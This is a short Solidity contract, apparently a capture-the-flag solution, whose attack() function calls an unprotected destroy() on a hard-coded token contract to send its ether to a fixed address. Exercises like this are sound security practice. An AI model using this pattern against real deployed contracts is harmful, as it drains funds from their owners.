/**
 *Submitted for verification at Etherscan.io on 2022-10-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface SimpleToken {
    // clean up after ourselves
    function destroy(address payable _to) external;
}

contract Recovery {
    SimpleToken atktoken =
        SimpleToken(0x9852aF380460da907eaa5A550772e6a17CCCA665);

    function attack() public {
        atktoken.destroy(0xaD4cB06582D71158C2b7Bccdcd30D77997b220bD);
    }
}